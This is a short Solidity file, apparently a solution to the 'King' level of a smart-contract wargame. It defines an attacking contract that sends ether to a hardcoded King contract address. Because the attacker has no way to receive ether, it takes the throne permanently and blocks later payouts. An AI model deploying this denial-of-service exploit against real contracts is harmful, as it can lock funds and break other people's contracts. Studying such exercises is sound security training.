// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Levels/King.sol";

contract KingAttack {
  King king = King(payable(0x8e80FFe6Dc044F4A766Afd6e5a8732Fe0977A493));

  function attack() public payable {
    (bool success, ) = payable(address(king)).call{value: msg.value}("");
    require(success, "call not successful");
  }
}
